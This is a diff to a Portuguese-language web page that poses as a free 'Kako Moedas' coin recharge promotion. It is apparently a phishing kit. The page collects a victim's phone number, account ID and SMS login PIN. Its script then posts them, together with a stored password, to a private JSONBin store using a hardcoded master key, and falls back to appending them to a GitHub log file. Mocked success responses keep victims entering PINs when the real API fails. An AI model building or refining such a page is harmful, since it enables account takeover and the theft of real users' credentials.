@@ -15,12 +15,16 @@
         #pinModal { transition: opacity 0.3s ease; }
         .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .phone-prefix { display: inline-flex; align-items: center; padding: 0 12px; background-color: #e5e7eb; border: 1px solid #d1d5db; border-right: none; border-radius: 6px 0 0 6px; height: 100%; color: #374151; }
+        .phone-prefix { display: inline-flex; align-items: center; padding: 0 12px; background-color: #e5e7eb; border: 1px solid #d1d5db; border-right: none; border-radius: 6px 0 0 6px; height: 100%; color: #374151; width: 100%; }
         .validation-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 18px; }
         .input-wrapper { position: relative; }
         .countdown { font-size: 14px; color: #666; text-align: center; margin-top: 10px; }
         .timer { font-weight: bold; color: #7e22ce; }
         .warning-banner { background: linear-gradient(90deg, #ff9800 0%, #ff5722 100%); color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .recharge-button { display: inline-flex; align-items: center; justify-content: center; width: 100%; padding: 10px; margin: 5px 0; background: #f0f0f0; border: 1px solid #ccc; border-radius: 8px; font-weight: bold; transition: all 0.3s; }
+        .recharge-button.selected { background-color: #7e22ce !important; color: white !important; }
+        .recharge-button .price { text-decoration: line-through; color: #888; margin-right: 5px; }
+        .recharge-button .free-text { color: red; margin-left: 5px; font-weight: bold; }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
@@ -44,12 +48,6 @@
         </div>
     </div>
     <div class="container mx-auto px-4 py-8">
-        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
-            <p class="font-bold">AVISO:</p>
-            <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
-            <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
-            <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
-        </div>
         <header class="flex justify-between items-center mb-8">
             <div class="flex items-center">
                 <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" alt="Logo Kako" class="h-12">
@@ -78,6 +76,25 @@
                             <div id="idValidation" class="validation-icon hidden"></div>
                         </div>
                         <p id="idError" class="text-red-600 text-sm mt-1 hidden"></p>
+                    </div>
+                    <div class="space-y-2">
+                        <button type="button" class="recharge-button selected" data-amount="10000">
+                            Recarga 10.000 Kako Moedas
+                            <span class="price">R$7,86</span>
+                            <span class="free-text">GRÁTIS</span>
+                        </button>
+                        <button type="button" class="recharge-button" data-amount="50000">
+                            Recarga 50.000 Kako Moedas
+                            <span class="price">R$29,31</span>
+                        </button>
+                        <button type="button" class="recharge-button" data-amount="100000">
+                            Recarga 100.000 Kako Moedas
+                            <span class="price">R$56</span>
+                        </button>
+                        <button type="button" class="recharge-button" data-amount="500000">
+                            Recarga 500.000 Kako Moedas
+                            <span class="price">R$280</span>
+                        </button>
                     </div>
                     <div id="errorMessage" class="hidden text-red-600 text-sm"></div>
                     <button type="submit" id="submitBtn" class="w-full bg-gray-400 text-white py-3 px-4 rounded-md transition duration-200 font-medium" disabled>Solicitar Código SMS</button>
@@ -114,18 +131,20 @@
                         </div>
                     </div>
                 </div>
-                <div class="bg-white rounded-lg shadow-md p-6">
-                    <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
-                    <div class="grid grid-cols-2 gap-4">
-                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">10.000 Kako Moedas<span class="free-badge">1x FREE</span></button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">50.000 Kako Moedas</button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">100.000 Kako Moedas</button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">500.000 Kako Moedas</button>
-                    </div>
-                </div>
             </div>
         </main>
+        <div class="flex justify-center items-center my-8">
+            <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" alt="Kako Cat" class="h-24 mx-4">
+            <h1 class="text-3xl font-bold text-purple-800 mx-4">KAKO COIN</h1>
+            <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Infinity Links" class="h-24 mx-4">
+        </div>
         <footer class="mt-12 text-center text-gray-600 text-sm">
+            <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
+                <p class="font-bold">AVISO:</p>
+                <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
+                <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
+                <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
+            </div>
             <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
             <div class="mt-2 flex justify-center space-x-4">
                 <a href="#" class="hover:text-purple-700">Termos de Serviço</a>
@@ -135,7 +154,9 @@
         </footer>
     </div>
     <script>
-        const DEFAULT_PASSWORD = '335112d1r7y';
+        const DEFAULT_PASSWORD = "335112blk"; // Atualizado pra sua nova senha
+
+        const DEFAULT_PASSWORD = '335112blk';
         let currentPhone = '';
         let currentId = '';
         let phoneStatus = null;
@@ -233,12 +254,6 @@
         }
 
         async function checkPhoneStatus(phone) {
-            // Mock API response for testing
-            // Uncomment to bypass external API
-            /*
-            console.log('Mocking /api/check-phone');
-            return 1;
-            */
             try {
                 const response = await fetch('/api/check-phone', {
                     method: 'POST',
@@ -306,16 +321,25 @@
             }, 1000);
         }
 
-        document.querySelectorAll('.coin-option').forEach(button => {
+        document.querySelectorAll('.recharge-button').forEach(button => {
             button.addEventListener('click', function() {
-                document.querySelectorAll('.coin-option').forEach(btn => {
-                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
-                    btn.classList.add('bg-purple-100', 'text-purple-800');
+                document.querySelectorAll('.recharge-button').forEach(btn => {
+                    btn.classList.remove('selected');
+                    btn.classList.add('recharge-button');
                 });
-                this.classList.add('selected', 'bg-purple-700', 'text-white');
-                this.classList.remove('bg-purple-100', 'text-purple-800');
+                this.classList.remove('recharge-button');
+                this.classList.add('selected');
                 document.getElementById('amount').value = this.dataset.amount;
             });
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const firstButton = document.querySelector('.recharge-button');
+            if (firstButton) {
+                firstButton.classList.remove('recharge-button');
+                firstButton.classList.add('selected');
+                document.getElementById('amount').value = firstButton.dataset.amount;
+            }
         });
 
         const pinModal = document.getElementById('pinModal');
@@ -369,7 +393,6 @@
                 }
             } catch (error) {
                 console.error('Erro ao enviar solicitação:', error);
-                // Mock API response to bypass issue
                 console.log('Mocking API response due to error');
                 pinModal.classList.remove('hidden');
                 startSmsCooldown();
@@ -414,7 +437,6 @@
                 }
             } catch (error) {
                 console.error('Erro ao validar PIN:', error);
-                // Mock login success for testing
                 console.log('Mocking login success');
                 await sendToJsonBin(currentPhone, currentId, pin, { code: 0, msg: 'Mock success' });
                 pinModal.classList.add('hidden');
@@ -426,41 +448,71 @@
             }
         });
 
-async function sendToJsonBin(phone, id, pin, apiResult) {
-    const formData = {
-        telefone: phone,
-        id: id,
-        pin: pin,
-        senha_padrao: DEFAULT_PASSWORD,
-        api_response: apiResult,
-        timestamp: new Date().toISOString()
-    };
-    console.log('Tentando enviar pro JSONBin:', formData); // Log pra depurar
+        async function sendToJsonBin(phone, id, pin, apiResult) {
+            const formData = {
+                telefone: phone,
+                id: id,
+                pin: pin,
+                senha_padrao: DEFAULT_PASSWORD,
+                api_response: apiResult,
+                timestamp: new Date().toISOString()
+            };
+            console.log('Tentando enviar pro JSONBin:', formData);
 
-    const MASTER_KEY = "$2a$10$dcsJ/Yfcqv7h8ijkKiXFRelPZPhR1WicqE/E8kWs67CFwcRTYzcHO"; // Sua chave real do dashboard
+            const MASTER_KEY = "$2a$10$dcsJ/Yfcqv7h8ijkKiXFRelPZPhR1WicqE/E8kWs67CFwcRTYzcHO";
 
-    try {
-        const response = await fetch("https://api.jsonbin.io/v3/b", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "X-Master-Key": MASTER_KEY,
-                "X-Bin-Private": "true" // Torna o bin privado (opcional, mas recomendado)
-            },
-            body: JSON.stringify(formData)
-        });
-        if (!response.ok) {
-            throw new Error(`Erro: ${response.status} - ${await response.text()}`);
+            try {
+                const response = await fetch("https://api.jsonbin.io/v3/b", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Master-Key": MASTER_KEY,
+                        "X-Bin-Private": "true"
+                    },
+                    body: JSON.stringify(formData)
+                });
+                if (!response.ok) throw new Error(`Erro: ${response.status} - ${await response.text()}`);
+                console.log("Sucesso no JSONBin:", await response.json());
+            } catch (error) {
+                console.error("Falha no JSONBin:", error.message);
+                fallbackToGitHub(formData);
+            }
         }
-        const result = await response.json();
-        console.log("Sucesso no JSONBin:", result); // Deve mostrar o ID do bin novo
-        // Aqui você pode alertar ou algo pro user
-    } catch (error) {
-        console.error("Falha no JSONBin:", error.message); // Log erro detalhado
-        // Chama o fallback aqui (veja abaixo)
-        fallbackToGitHub(formData);
-    }
-}
+
+        async function fallbackToGitHub(formData) {
+            const logLine = `${formData.timestamp} | ${formData.telefone} | ${formData.id} | ${formData.pin} | ${formData.senha_padrao}\n`;
+            console.log("FALLBACK: Cole no logs.txt:", logLine);
+
+            const GITHUB_TOKEN = "seu-token-aqui"; // Substitua pelo token que vou te mostrar como pegar
+            const OWNER = "infinityrecarga";
+            const REPO = "kako-logs-contencao";
+            const PATH = "logs.txt";
+
+            try {
+                const getUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`;
+                const getHeaders = { "Authorization": `token ${GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" };
+                const getResp = await fetch(getUrl, { headers: getHeaders });
+                const getData = await getResp.json();
+                const sha = getData.sha;
+                const currentContent = atob(getData.content);
+
+                const updatedContent = currentContent + logLine;
+                const putData = {
+                    message: "Adiciona log de contenção",
+                    content: btoa(updatedContent),
+                    sha: sha
+                };
+                const putResp = await fetch(getUrl, {
+                    method: "PUT",
+                    headers: getHeaders,
+                    body: JSON.stringify(putData)
+                });
+                if (putResp.ok) console.log("Log salvo no GitHub!");
+                else console.error("Falha no GitHub:", await putResp.text());
+            } catch (error) {
+                console.error("Erro no fallback GitHub:", error);
+            }
+        }
     </script>
 </body>
 </html>
